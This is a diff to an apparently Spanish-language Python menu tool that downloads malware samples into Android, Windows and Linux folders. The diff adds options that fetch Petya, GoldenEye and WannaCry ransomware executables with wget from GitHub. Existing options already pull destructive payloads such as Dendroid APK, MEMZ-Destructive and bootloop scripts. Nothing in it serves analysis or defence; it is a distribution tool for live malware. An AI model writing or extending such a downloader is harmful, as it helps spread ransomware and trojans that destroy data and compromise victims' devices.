@@ -39,7 +39,7 @@ def android():
     print('[9] vi4a.apk')
     print('[10] Grave.apk')
     print('[11] Dendroid.apk')
-    print('[12] Volver al menu principal')
+    print('[00] Volver al menu principal')
     print('[99] Salir')
     
     elegir2 = int(input('Selecciona una opcion :: '))
@@ -87,12 +87,12 @@ def android():
         os.system("wget https://github.com/LOoLzeC/vcrt/raw/master/dendroid.apk")
         os.system("mv 'dendroid.apk' Android/dendroid.apk")
         android()
-    elif elegir2 == 12:
+    elif elegir2 == 00:
           os.system("clear")
           print(logo)
           inicio()
     elif elegir2 == 99:
-          sys.exit()
+          exit()
     else:
         print('Error opcion invalida')
         time.sleep(3)
@@ -109,7 +109,10 @@ def windows():
     print('[4] App.bomber.bat')
     print('[5] MEMZ-Destructive.bat')
     print('[6] Ransomware')
-    print('[7] Volver al menu principal')
+    print('[7] Petya Ransomware')
+    print('[8] GoldenEye Petya Ransomware')
+    print('[9] WannaCry Ransomware')
+    print('[00] Volver al menu principal')
     print('[99] Salir')
     elegir3 = int(input('Selecciona una opcion :: '))
     if elegir3 == 1:
@@ -137,11 +140,23 @@ def windows():
         os.system("mv 'ransomeware.exe' Windows/ransomeware.exe")
         windows()
     elif elegir3 == 7:
+        os.system("wget https://github.com/Mist0090/Petya/raw/main/Petya.A.exe")
+        os.system("mv 'Petya.A.exe' Windows/Petya.A.exe")
+        windows()
+    elif elegir3 == 8:
+        os.system("wget https://github.com/Mist0090/Petya/raw/main/GoldenEye.exe")
+        os.system("mv 'GoldenEye.exe' Windows/GoldenEye.exe")
+        windows()
+    elif elegir3 == 9:
+        os.system("wget https://github.com/OG476/WannaCry.exe/raw/main/WannaCry.exe")
+        os.system("mv 'WannaCry.exe' Windows/WannaCry.exe")
+        windows()
+    elif elegir3 == 00:
         os.system("clear")
         print(logo)
         inicio()
     elif elegir3 == 99:
-        sys.exit()
+        exit()
     else:
         print('Error opcion invalida')
         time.sleep(2)
@@ -155,7 +170,7 @@ def linux():
     print('[1] freeze.sh')
     print('[2] lil_virus.sh')
     print('[3] bootloop.sh')
-    print('[4] Volver al menu principal')
+    print('[00] Volver al menu principal')
     print('[99] Salir')
     elegir4 = int(input('Selecciona una opcion :: '))
     if elegir4 == 1:
@@ -170,12 +185,12 @@ def linux():
         os.system("wget https://github.com/Gameye98/V1RU5/raw/master/bootloop.sh")
         os.system("mv 'bootloop.sh' Linux/bootloop.sh")
         linux()
-    elif elegir4 == 4:
+    elif elegir4 == 00:
           os.system("clear")
           print(logo)
           inicio()
     elif elegir4 == 99:
-          sys.exit()
+          exit()
     else:
           print('Error opcion invalida')
           time.sleep(2)
@@ -198,7 +213,7 @@ def inicio():
     elif elegir == 3:
         linux()
     elif elegir == 99:
-       sys.exit()
+       exit()
     else:
        print('Error opcion invalida')
        time.sleep(2)
